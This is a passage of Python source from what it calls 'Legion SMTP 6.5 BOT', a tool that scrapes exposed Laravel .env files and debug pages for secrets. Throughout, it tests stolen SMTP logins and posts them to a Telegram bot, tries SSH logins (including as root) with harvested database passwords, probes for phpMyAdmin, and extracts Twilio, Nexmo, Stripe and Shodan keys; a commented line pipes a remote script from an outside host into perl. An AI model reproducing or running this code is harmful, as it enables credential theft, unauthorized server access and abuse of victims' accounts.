            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    elif 'mailgun' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = "King MAILGUN smtps! - SMTP Data for you!\n{2} \n\nMailer King with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer king Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "MailGun Forza SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Legion SMTP 6.5 BOT [MailGun Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    elif 'mandrillapp' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = "King MANDRILL smtps! - SMTP Data for you!\n{2} \n\nMailer King with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer king Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "MandDrill Forza SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Legion SMTP 6.5 BOT [ManDrillAPP Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    elif 'mailjet' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = "King MAILJET smtps! - SMTP Data for you!\n{2} \n\nMailer King with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer king Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "MailJet Forza SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Legion SMTP 6.5 BOT [MailJet Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    else:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = "King Normal smtps! - SMTP Data for you!\n{2} \n\nMailer King with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer king Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "Legion Forza SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Legion SMTP 6.5 BOT [SMTP Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
class pma():

    def __init__(self, url):
        self.url = url
        self.path = ['/phpmyadmin/']
        self.user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1'
        if '://' not in self.url:
            self.url = ('http://{}').format(self.url)
        if self.url.endswith('/'):
            self.url = self.url[:-1]

    def check(self):
        back = False
        headers = {'User-Agent': self.user_agent}
        for i in self.path:
            try:
                url = ('{url}{path}').format(url=self.url, path=i)
                get = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                if '200' in str(get.status_code):
                    back = url
                    break
            except:
                pass

        return back
class sendme():

    def mail(self,host, port, user, password, fromaddr):
        #print('\032[1;91m{}:{}:{}:{}:{}').format(host, port, user, password, fromaddr)
        if 'sendgrid' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailerking smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,fromaddr)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 Sendgrid Forza SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        elif 'mandrillapp' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailerking smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,user)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 Mandrill Forza SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        elif '.amazonaws.com' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailerking smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,user)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 AWS Forza SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        elif 'mailgun' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailerking smtp\n{}:{}:{}:{}::ssl::::0:".format(host, port, user, password)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 MailGun Forza SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        else:
            try:
                fromaddr = fromaddr = str(user)
                toaddr = emailnow
                body = "Mailerking smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,fromaddr)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 Forza SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
class legion:
	def get_Vps(sel, text, url):
		if 'DB_PASSWORD' in text and 'DB_HOST' in text:
			if '://' in url:
				parse = url.split('://', 2)
				parse = parse[1]
				parse = parse.split('/')
				host = parse[0]
			else:
				parse = parse.split('/')
				host = parse[0]

			# grab password
			if 'DB_USERNAME=' in text:
				method = './env'
				db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
				db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
			elif '<td>DB_USERNAME</td>' in text:
				method = 'debug'
				db_user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				db_pass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

			# login ssh
			if db_user and db_pass:
				connected = 0
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				try:
					ssh.connect(host, 22, db_user, db_pass, timeout=3)
					fp = open('Results/!Vps.txt', 'a+')
					build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
					remover = str(build).replace('\r', '')
					fp.write(remover + '\n\n')
					fp.close()
					connected += 1
				except:
					pass
				finally:
					if ssh:
						ssh.close()

				if db_user != 'root':
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, 'root', db_pass, timeout=30)
						fp = open('Results/!Vps.txt', 'a+')
						build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if '_' in db_user:
					aw, iw = db_user.split('_')
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					#stdin, stdout, stderr = ssh.exec_command("cd /tmp; wget -qO - narcio.com/lans1|perl; curl -s narcio.com/lans1|perl")
					try:
						ssh.connect(host, 22, iw, db_pass, timeout=30)
						fp = open('Results/!Vps.txt', 'a+')
						build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, aw, db_pass, timeout=30)
						fp = open('Results/!Vps.txt', 'a+')
						build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if connected > 0:
					return connected
				else:
					return False
		else:
			return False
	def get_twillio(self, text, url):
		if '<td>TWILIO_ACCOUNT_SID</td>' in text:
		  acc_sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
		  auhtoken = re.findall('<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{auhtoken}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if '<td>TWILIO_SID</td>' in text:
		  acc_sid = re.findall('<td>TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  auhtoken = re.findall('<td>TWILIO_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{auhtoken}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if '<td>#TWILIO_SID</td>' in text:
		  acc_sid = re.findall('<td>#TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  auhtoken = re.findall('<td>#TWILIO_AUTH<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{acc_key}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if '<td>#TWILIO_ACCOUNT_SID</td>' in text:
		  acc_sid = re.findall('<td>#TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
		  auhtoken = re.findall('<td>#TWILIO_ACCOUNT_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{auhtoken}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if 'TWILIO_ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{auhtoken}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if 'TWILIO_SID=' in text:
		  acc_sid = re.findall('\nTWILIO_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\nTWILIO_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{auhtoken}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if '#TWILIO_ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\n#TWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\n#TWILIO_ACCOUNT_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{acc_key}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if 'ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\nACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\nAUTH_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{auhtoken}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
		if '#ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\n#ACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\n#AUTH_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{auhtoken}{fc}]")
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {res}{url} | {red}Not Vuln !!{res}")
	def get_nexmo(self, text, url):
		if 'NEXMO_KEY=' in text:
			key = re.findall('NEXMO_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])

				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")


		elif 'NEXMO_API_KEY=' in text:
			key = re.findall('NEXMO_API_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_API_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif 'NEXMO_KEY' in text:
			key = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif 'NEXMO_API_KEY' in text:
			key = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif 'SMS_API_KEY' in text:
			key = re.findall('<td>SMS_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>SMS_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
	def payment_api(self, text, url):

		if "PAYPAL_" in text:
			save = open(o_sandbox,'a')
			save.write(url+'\n')
			save.close()
			return True
		elif "STRIPE_KEY" in text:
			if "STRIPE_KEY=" in text:
				method = '/.env'
				try:
					stripe_key = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('\nSTRIPE_SECRET=(.*?)\n', text)[0]
				except:
					stripe_secret = ''
			elif "<td>STRIPE_SECRET</td>" in text:
				method = 'debug'
				try:
					stripe_key = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_secret = ''
			build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
			remover = str(build).replace('\r', '')
			save = open(o_stripe, 'a')
			save.write(remover+'\n')
			save.close()
			saveurl = open(o_stripe_site,'a')
			removerurl = str(url).replace('\r', '')
			saveurl.write(removerurl+'\n')
			saveurl.close()
		else:
			return False
	def get_shodan(self, text, url):
		try:
			if "SHODAN" in text:
				if "SHODAN_API_KEY=" in text:
					method = '/.env'
					try:
						xixi_key = reg('\nSHODAN_API_KEY=(.*?)\n', text)[0]
					except:
						xixi_key = ''
					try:
						req_tim = reg('\nSHODAN_REQUEST_TIMEOUT=(.*?)\n', text)[0]
					except:
						req_tim = ''
					try:
						sec = reg('\nCODECOV_TOKEN=(.*?)\n', text)[0]
					except:
						sec = ''
				elif '<td>SHODAN_API_KEY</td>' in text:
					method = 'get-config'
					try:
						xixi_key = reg('<td>SHODAN_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						xixi_key = ''
					try:
						req_tim = reg('<td>SHODAN_REQUEST_TIMEOUT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						req_tim = ''
					try:
						sec = reg('<td>CODECOV_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''
